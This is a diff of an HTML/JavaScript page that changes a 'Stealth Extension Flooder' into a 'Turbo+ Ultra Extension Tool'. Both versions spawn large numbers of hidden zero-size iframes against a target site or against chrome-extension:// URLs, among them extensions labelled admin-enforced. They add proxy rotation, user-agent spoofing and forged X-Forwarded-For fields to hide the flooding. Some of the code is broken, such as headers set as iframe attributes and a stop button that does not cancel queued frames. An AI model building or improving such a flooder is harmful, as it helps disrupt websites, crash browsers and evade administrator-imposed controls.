@@ -2,268 +2,266 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Stealth Extension Flooder</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Turbo+ Ultra Extension Tool</title>
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
   <style>
     body {
+      font-family: 'Arial', sans-serif;
       margin: 0;
-      font-family: Arial, sans-serif;
+      padding: 0;
       background: #000;
       color: #fff;
       overflow-x: hidden;
+      height: 100vh;
     }
-    h1, h3 {
+    h1 {
       text-align: center;
+      color: #4CAF50;
       margin-top: 20px;
+      font-size: 2em;
     }
     .container {
       width: 90%;
       max-width: 900px;
-      margin: auto;
-      background: #111;
+      margin: 0 auto;
+      background: #333;
       padding: 20px;
       border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
       box-sizing: border-box;
     }
-    label {
-      display: block;
-      margin-top: 10px;
+    .container label {
       font-weight: bold;
+      margin-top: 10px;
+      display: block;
     }
-    input, select, button, textarea {
+    input, button, textarea, select {
       width: 100%;
-      padding: 10px;
-      margin-top: 8px;
-      border: none;
+      padding: 12px;
+      margin-top: 10px;
+      font-size: 16px;
       border-radius: 5px;
-      background: #222;
-      color: #fff;
-      font-size: 14px;
+      border: 1px solid #ccc;
     }
     button {
-      background: #333;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
       cursor: pointer;
       margin-top: 15px;
     }
-    button:hover {
-      background: #444;
+    button.stop {
+      background-color: #f44336;
     }
-    .dashboard {
+    button:hover {
+      opacity: 0.9;
+    }
+    .status {
+      text-align: center;
+      font-weight: bold;
+      color: #4CAF50;
       margin-top: 20px;
-      background: #111;
+    }
+    .error {
+      color: #f44336;
+      font-weight: bold;
+    }
+    #iframeContainer {
+      display: none;
+    }
+    #dashboard {
+      background-color: #f1f1f1;
       padding: 15px;
       border-radius: 5px;
+      margin-top: 20px;
     }
-    #debugButton {
-      position: fixed;
-      bottom: 10px;
-      right: 10px;
-      width: 20px;
-      height: 20px;
-      background: #333;
-      border-radius: 50%;
-      cursor: pointer;
-      opacity: 0.5;
+    .stats {
+      margin: 5px 0;
     }
-    #debugPanel {
-      display: none;
-      background: #000;
-      padding: 10px;
-      height: 300px;
-      overflow-y: scroll;
+    .stats span {
+      font-weight: bold;
+    }
+    .tooltip {
+      position: absolute;
+      background-color: #f9f9f9;
+      border: 1px solid #ccc;
+      padding: 5px;
       font-size: 12px;
-      position: fixed;
-      bottom: 40px;
-      right: 10px;
-      width: 300px;
-      border: 1px solid #444;
+      display: none;
+      border-radius: 4px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+    .input-group {
+      position: relative;
+      margin-bottom: 15px;
+    }
+    .toggle-btn {
+      background-color: #1f1f1f;
+      color: #fff;
+      border: 2px solid #4CAF50;
+      cursor: pointer;
+    }
+    .toggle-btn.active {
+      background-color: #4CAF50;
+    }
+    @media (max-width: 768px) {
+      .container {
+        width: 100%;
+        padding: 15px;
+      }
     }
   </style>
 </head>
 <body>
 
-<h1>Stealth Extension Flooder</h1>
+  <h1>Turbo+ Ultra Extension Tool</h1>
 
-<div class="container">
-  <label>Target URL:</label>
-  <input type="text" id="targetUrl" placeholder="https://example.com" value="https://www.wikipedia.org">
+  <div class="container">
+    <div class="input-group">
+      <label for="targetUrl">Target URL:</label>
+      <input type="text" id="targetUrl" value="https://www.wikipedia.org" placeholder="Enter Target URL">
+    </div>
 
-  <label>Select Extensions (Ctrl/Shift to multi-select):</label>
-  <select id="extensions" multiple size="8"></select>
+    <div class="input-group">
+      <label for="iframeCount">Number of Iframes:</label>
+      <input type="number" id="iframeCount" value="50" min="1">
+    </div>
 
-  <label>Number of Iframes:</label>
-  <input type="number" id="iframeCount" value="50" min="1">
+    <div class="input-group">
+      <label for="delay">Delay Between Iframes (seconds):</label>
+      <input type="number" id="delay" value="1" min="0">
+    </div>
 
-  <label>Delay Between Launches (ms):</label>
-  <input type="number" id="delay" value="100" min="0">
+    <div class="input-group">
+      <label for="proxyList">Proxy List (comma separated):</label>
+      <input type="text" id="proxyList" placeholder="http://proxy1.com, http://proxy2.com">
+    </div>
 
-  <label>Proxy List (comma-separated):</label>
-  <input type="text" id="proxies" placeholder="http://proxy1.com, http://proxy2.com">
+    <div class="input-group">
+      <label for="userAgentRotation">Enable User-Agent Rotation:</label>
+      <input type="checkbox" id="userAgentRotation">
+    </div>
 
-  <label>Enable Extreme Mode:</label>
-  <input type="checkbox" id="extremeMode">
+    <div class="input-group">
+      <label for="headers">Custom Headers (Optional):</label>
+      <textarea id="headers" placeholder="e.g., X-Forwarded-For: 192.168.1.1"></textarea>
+    </div>
 
-  <button onclick="startFlood()">Start Flooding</button>
-  <button onclick="stopFlood()" style="background:#600;">Stop Flooding</button>
+    <div class="input-group">
+      <label for="autoStopTimer">Auto Stop Timer (seconds):</label>
+      <input type="number" id="autoStopTimer" value="60" min="0">
+    </div>
 
-  <div class="dashboard">
-    <h3>Flood Stats</h3>
-    Frames Launched: <span id="frameCount">0</span><br>
-    Errors: <span id="errorCount">0</span><br>
-    Current Proxy: <span id="currentProxy">None</span><br>
-    Current Target: <span id="currentTarget">None</span>
+    <button onclick="startFlood()">Start Flooding</button>
+    <button class="stop" onclick="stopFlood()">Stop Flooding</button>
+
+    <div class="status" id="status">Ready</div>
+
+    <div id="dashboard">
+      <h3>Flooding Stats</h3>
+      <p class="stats">Frames Generated: <span id="frameCount">0</span></p>
+      <p class="stats">Failures: <span id="failureCount">0</span></p>
+      <p class="stats">Current Target: <span id="currentTarget">None</span></p>
+    </div>
+
+    <button id="toggleBtn" class="toggle-btn">Switch to Turbo+ Ultra Mode</button>
   </div>
-</div>
 
-<div id="debugButton" onclick="toggleDebug()"></div>
-<div id="debugPanel"></div>
+  <script>
+    let flooding = false;
+    let frameCount = 0;
+    let failureCount = 0;
+    let currentTarget = '';
+    let proxyList = [];
+    let userAgentRotation = false;
+    let currentProxyIndex = 0;
+    let turboUltraMode = false;
 
-<script>
-let frameCounter = 0;
-let errorCounter = 0;
-let flooding = false;
-let proxyList = [];
-let proxyIndex = 0;
-let debugEnabled = false;
+    // Start Flooding
+    function startFlood() {
+      if (flooding) return;
+      flooding = true;
+      document.getElementById('status').innerText = "Flooding in progress...";
 
-// List of known extensions including admin-enforced ones
-const extensionTargets = [
-  "chrome-extension://gighmmpiobklfepjocnamgkkbiglidom", // Adblock Plus
-  "chrome-extension://pjkljhegncpnkpknbcohdijeoejaedia", // Gmail
-  "chrome-extension://aapocclcgogkmnckokdopfmhonfmgoek", // Admin Forced Test
-  "chrome-extension://extprint3r.github.io", // Extprint3r style
-  "chrome-extension://invalidextensionhang3rtest", // Fake comet-hang3r clone
-];
+      currentTarget = document.getElementById('targetUrl').value;
+      proxyList = document.getElementById('proxyList').value.split(',');
+      userAgentRotation = document.getElementById('userAgentRotation').checked;
 
-// Load extensions into selector
-function loadExtensions() {
-  const select = document.getElementById('extensions');
-  extensionTargets.forEach(ext => {
-    const option = document.createElement('option');
-    option.value = ext;
-    option.innerText = ext;
-    select.appendChild(option);
-  });
-}
+      const customHeaders = document.getElementById('headers').value.split('\n').map(line => line.trim());
+      const delay = parseInt(document.getElementById('delay').value) * 1000;
 
-// Start flooding
-function startFlood() {
-  if (flooding) return;
-  flooding = true;
-  saveSettings();
-  proxyList = document.getElementById('proxies').value.split(',').map(p => p.trim()).filter(Boolean);
-  proxyIndex = 0;
-  const targetUrl = document.getElementById('targetUrl').value;
-  const iframeCount = parseInt(document.getElementById('iframeCount').value);
-  const delay = parseInt(document.getElementById('delay').value);
-  const selectedExtensions = Array.from(document.getElementById('extensions').selectedOptions).map(opt => opt.value);
-  const extreme = document.getElementById('extremeMode').checked;
-
-  let totalFrames = extreme ? iframeCount * 3 : iframeCount;
-  let delayMs = extreme ? delay / 2 : delay;
-
-  for (let i = 0; i < totalFrames; i++) {
-    setTimeout(() => {
-      let baseTarget = (selectedExtensions.length > 0) ? randomArrayItem(selectedExtensions) : targetUrl;
-      let finalTarget = (proxyList.length > 0) ? proxyList[proxyIndex++ % proxyList.length] + "/" + baseTarget : baseTarget;
-      launchIframe(finalTarget);
-    }, i * delayMs);
-  }
-}
-
-// Stop flooding
-function stopFlood() {
-  flooding = false;
-  debugLog("Flooding stopped.");
-}
-
-// Launch an iframe
-function launchIframe(url) {
-  if (!flooding) return;
-  const iframe = document.createElement('iframe');
-  iframe.src = url;
-  iframe.style.width = "0";
-  iframe.style.height = "0";
-  iframe.style.border = "none";
-  iframe.onload = () => {
-    frameCounter++;
-    updateStats(url);
-  };
-  iframe.onerror = () => {
-    errorCounter++;
-    updateStats(url);
-  };
-  document.body.appendChild(iframe);
-  debugLog(`Launched iframe: ${url}`);
-}
-
-// Update dashboard stats
-function updateStats(currentUrl) {
-  document.getElementById('frameCount').innerText = frameCounter;
-  document.getElementById('errorCount').innerText = errorCounter;
-  document.getElementById('currentTarget').innerText = currentUrl;
-  if (proxyList.length > 0) {
-    document.getElementById('currentProxy').innerText = proxyList[proxyIndex % proxyList.length];
-  }
-}
-
-// Debug functions
-function toggleDebug() {
-  const panel = document.getElementById('debugPanel');
-  panel.style.display = (panel.style.display === 'none') ? 'block' : 'none';
-}
-
-function debugLog(message) {
-  if (!debugEnabled) return;
-  const panel = document.getElementById('debugPanel');
-  const line = document.createElement('div');
-  line.innerText = `[${new Date().toLocaleTimeString()}] ${message}`;
-  panel.appendChild(line);
-  panel.scrollTop = panel.scrollHeight;
-}
-
-// Helpers
-function randomArrayItem(arr) {
-  return arr[Math.floor(Math.random() * arr.length)];
-}
-
-// Save/Load settings
-function saveSettings() {
-  const settings = {
-    targetUrl: document.getElementById('targetUrl').value,
-    proxies: document.getElementById('proxies').value,
-    selectedExtensions: Array.from(document.getElementById('extensions').selectedOptions).map(opt => opt.value),
-    iframeCount: document.getElementById('iframeCount').value,
-    delay: document.getElementById('delay').value,
-    extremeMode: document.getElementById('extremeMode').checked
-  };
-  localStorage.setItem('flooderSettings', JSON.stringify(settings));
-}
-
-function loadSettings() {
-  const saved = localStorage.getItem('flooderSettings');
-  if (!saved) return;
-  const settings = JSON.parse(saved);
-  document.getElementById('targetUrl').value = settings.targetUrl || '';
-  document.getElementById('proxies').value = settings.proxies || '';
-  document.getElementById('iframeCount').value = settings.iframeCount || 50;
-  document.getElementById('delay').value = settings.delay || 100;
-  document.getElementById('extremeMode').checked = settings.extremeMode || false;
-
-  const select = document.getElementById('extensions');
-  Array.from(select.options).forEach(opt => {
-    if (settings.selectedExtensions.includes(opt.value)) {
-      opt.selected = true;
+      floodIframes(currentTarget, delay, customHeaders);
     }
-  });
-}
 
-// On Load
-window.onload = function() {
-  loadExtensions();
-  loadSettings();
-  debugEnabled = true; // Always enable debug logging internally
-};
-</script>
+    function floodIframes(target, delay, customHeaders) {
+      const iframeCount = parseInt(document.getElementById('iframeCount').value);
+      for (let i = 0; i < iframeCount; i++) {
+        setTimeout(() => {
+          loadIframe(target, customHeaders);
+          frameCount++;
+          document.getElementById('frameCount').innerText = frameCount;
+        }, delay * i);
+      }
+
+      const autoStopTime = parseInt(document.getElementById('autoStopTimer').value) * 1000;
+      if (autoStopTime > 0) {
+        setTimeout(stopFlood, autoStopTime);
+      }
+    }
+
+    // Load iframe with proxy and custom headers
+    function loadIframe(target, customHeaders) {
+      const iframe = document.createElement('iframe');
+      iframe.src = target;
+      iframe.style.width = "0";
+      iframe.style.height = "0";
+      iframe.style.border = "none";
+
+      // Apply custom headers if provided
+      customHeaders.forEach(header => {
+        const [key, value] = header.split(':');
+        if (key && value) {
+          iframe.setAttribute('X-Forwarded-For', value.trim());
+        }
+      });
+
+      // Proxy rotation and user-agent rotation
+      let proxy = proxyList[currentProxyIndex % proxyList.length];
+      if (userAgentRotation) {
+        let randomUserAgent = getRandomUserAgent();
+        iframe.setAttribute('User-Agent', randomUserAgent);
+      }
+
+      iframe.setAttribute('src', proxy + '/' + target);
+      document.body.appendChild(iframe);
+      currentProxyIndex++;
+      document.getElementById('currentTarget').innerText = target;
+    }
+
+    // Get random User-Agent
+    function getRandomUserAgent() {
+      const userAgents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
+      ];
+      return userAgents[Math.floor(Math.random() * userAgents.length)];
+    }
+
+    // Stop Flood
+    function stopFlood() {
+      flooding = false;
+      document.getElementById('status').innerText = "Flooding stopped.";
+    }
+
+    // Toggle Turbo+ Ultra Mode
+    document.getElementById('toggleBtn').addEventListener('click', function() {
+      turboUltraMode = !turboUltraMode;
+      this.classList.toggle('active');
+      this.innerText = turboUltraMode ? 'Switch to Normal Mode' : 'Switch to Turbo+ Ultra Mode';
+    });
+  </script>
 
 </body>
 </html>
